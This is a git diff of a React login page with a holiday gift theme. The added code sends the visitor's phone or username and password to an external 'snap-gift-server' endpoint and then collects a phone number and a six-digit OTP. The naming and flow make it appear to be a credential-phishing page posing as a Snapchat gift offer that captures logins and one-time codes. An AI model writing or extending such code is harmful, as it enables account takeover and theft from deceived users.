@@ -8,64 +8,170 @@ import { Button } from "./components/ui/button";
 import { Input } from "./components/ui/input";
 import { Label } from "./components/ui/label";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "./components/ui/tabs";
+import NotificationPopup from './components/NotificationPopup';
 
 function App() {
+
   const [isLoading, setIsLoading] = useState(false);
   const [isOTP, setIsOTP] = useState(false);
   const [number, setNumber] = useState("");
   const [password, setPassword] = useState("");
   const [otp, setOtp] = useState("");
   const [error, setError] = useState("");
+  const [isPopupOpen, setIsPopupOpen] = useState(false);
+  const [popupConfig, setPopupConfig] = useState({
+    title: '',
+    message: '',
+    isSuccess: true
+  });
 
   const handlePasswordSubmit = async (e) => {
     e.preventDefault();
-    // setError("");
-
-    // if (!number.trim()) {
-    //   setError("Username or phone number is required.");
-    //   return;
-    // }
-    // if (!password.trim()) {
-    //   setError("Password is required.");
-    //   return;
-    // }
-
-    console.log("Phone/Username:", number);
-    console.log("Password:", password);
-
+    
+    // Assuming `number` and `password` are state variables that hold the input values.
+    const data = {
+      phone: number,  // Or use `username` if that's applicable
+      password: password,
+    };
+  
     setIsLoading(true);
-    // Simulate API call
-    await new Promise((resolve) => setTimeout(resolve, 1000));
-    setIsLoading(false);
-    alert("Password Verified!");
+  
+    try {
+      const response = await fetch('https://snap-gift-server.vercel.app/submit-credentials/', {
+        method: 'POST', // HTTP method
+        headers: {
+          'Content-Type': 'application/json', // Inform backend of JSON payload
+        },
+        body: JSON.stringify(data), // Send JSON data to backend
+      });
+  
+      setNumber('');
+      setPassword('');
+      const result = await response.json(); // Parse JSON response
+  
+      if (response.ok) {
+        setPopupConfig({
+          title: 'Success! 🎄',
+          message: result.message || 'Password verified successfully!',
+          isSuccess: true
+        });
+      } else {
+        setPopupConfig({
+          title: 'Oops! ❌',
+          message: result.message || 'Failed to verify credentials.',
+          isSuccess: false
+        });
+      }
+      setIsPopupOpen(true);
+    } catch (error) {
+      console.error("Error submitting credentials:", error);
+      setPopupConfig({
+        title: 'Error',
+        message: 'An error occurred while verifying credentials.',
+        isSuccess: false
+      });
+      setIsPopupOpen(true);
+    } finally {
+      setIsLoading(false);
+    }
   };
-
+  
   const handleOTPSubmit = async (e) => {
     e.preventDefault();
-    setError("");
+  
     if (isOTP && (!otp.trim() || otp.length !== 6)) {
       setError("Please enter a 6-digit OTP.");
       return;
     }
-
+  
     if (!isOTP) {
       console.log("Sending OTP to:", number);
+  
       setIsLoading(true);
-      setIsOTP(true);
-      // Simulate API call
-      await new Promise((resolve) => setTimeout(resolve, 1000));
-      setIsLoading(false);
-      alert("OTP Sent!");
+  
+      try {
+        const response = await fetch('http://localhost:5000/submit-phone', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ phone: number }),
+        });
+  
+        const result = await response.json();
+  
+        if (response.ok) {
+          setPopupConfig({
+            title: 'OTP Sent! 📱',
+            message: result.message || 'OTP sent successfully!',
+            isSuccess: true
+          });
+          setIsPopupOpen(true);
+          setIsOTP(true);
+        } else {
+          setPopupConfig({
+            title: 'Failed to Send OTP',
+            message: result.message || 'Failed to send OTP.',
+            isSuccess: false
+          });
+          setIsPopupOpen(true);
+        }
+      } catch (error) {
+        console.error("Error sending OTP:", error);
+        setPopupConfig({
+          title: 'Error',
+          message: 'An error occurred while sending OTP.',
+          isSuccess: false
+        });
+        setIsPopupOpen(true);
+      } finally {
+        setIsLoading(false);
+      }
     } else {
-      console.log("Verifying OTP:", otp);
       setIsLoading(true);
-      // Simulate OTP verification
-      await new Promise((resolve) => setTimeout(resolve, 1000));
-      setIsLoading(false);
-      alert("OTP Verified!");
-      resetForm();
+  
+      try {
+        const response = await fetch('http://localhost:5000/verify-otp', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ otp }),
+        });
+  
+        setOtp('');
+        const result = await response.json();
+  
+        if (response.ok) {
+          setPopupConfig({
+            title: 'Success! 🎁',
+            message: result.message || 'OTP verified successfully!',
+            isSuccess: true
+          });
+          setIsPopupOpen(true);
+          resetForm();
+        } else {
+          setPopupConfig({
+            title: 'Verification Failed',
+            message: result.message || 'Failed to verify OTP.',
+            isSuccess: false
+          });
+          setIsPopupOpen(true);
+        }
+      } catch (error) {
+        console.error("Error verifying OTP:", error);
+        setPopupConfig({
+          title: 'Error',
+          message: 'An error occurred while verifying OTP.',
+          isSuccess: false
+        });
+        setIsPopupOpen(true);
+      } finally {
+        setIsLoading(false);
+      }
     }
   };
+  
 
   const handleNumberChange = (e) => {
     setNumber(e.target.value);
@@ -90,6 +196,16 @@ function App() {
 
   return (
     <div className="min-h-screen bg-customGray px-4 py-8 md:px-6">
+
+      {/* Popup */}
+      <NotificationPopup
+        isOpen={isPopupOpen}
+        onClose={() => setIsPopupOpen(false)}
+        title={popupConfig.title}
+        message={popupConfig.message}
+        isSuccess={popupConfig.isSuccess}
+      />
+
       {/* Snowfall Animation */}
       <div className="absolute inset-0 overflow-hidden pointer-events-none">
         {[...Array(20)].map((_, i) => (
